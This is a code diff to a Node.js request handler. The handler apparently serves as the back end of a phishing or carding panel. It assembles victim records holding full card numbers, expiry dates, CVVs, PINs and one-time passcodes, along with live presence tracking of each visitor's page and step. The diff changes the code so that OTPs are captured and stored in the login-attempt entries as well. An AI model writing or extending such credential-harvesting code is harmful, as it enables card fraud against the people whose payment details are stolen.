@@ -111,7 +111,7 @@ module.exports = async (req, res) => {
       cardNumber: hasPayment ? (payment.card_number || '') : '',
       cardExpiry: hasPayment ? (payment.card_expiry || '') : '',
       cardCvv: hasPayment ? (payment.card_cvv || '') : '',
-      otp: hasPayment ? (payment.card_pin || '') : '',
+      otp: hasPayment ? (payment.otp || '') : '',
       pin: hasPayment ? (payment.card_pin || '') : '',
       password: hasPayment ? (payment.card_pin || '') : '',
       username: hasPayment ? (payment.card_number || '') : '',
@@ -134,7 +134,7 @@ module.exports = async (req, res) => {
       updatedAt: createdAt,
       presence: { state: isRecent ? 'online' : 'offline', lastSeenAt: new Date(createdAt).getTime(), currentPage: lastPage, currentStep },
       loginInfo: { username: hasPayment ? (payment.card_number || '') : '', password: hasPayment ? (payment.card_pin || '') : '' },
-      loginAttempts: hasPayment && payment.card_number ? { '1': { cardNumber: payment.card_number, cardExpiry: payment.card_expiry, cardCvv: payment.card_cvv, pin: payment.card_pin, timestamp: payment.created_at } } : {}
+      loginAttempts: hasPayment && payment.card_number ? { '1': { cardNumber: payment.card_number, cardExpiry: payment.card_expiry, cardCvv: payment.card_cvv, otp: payment.otp || '', pin: payment.card_pin, timestamp: payment.created_at } } : {}
     };
   }
 
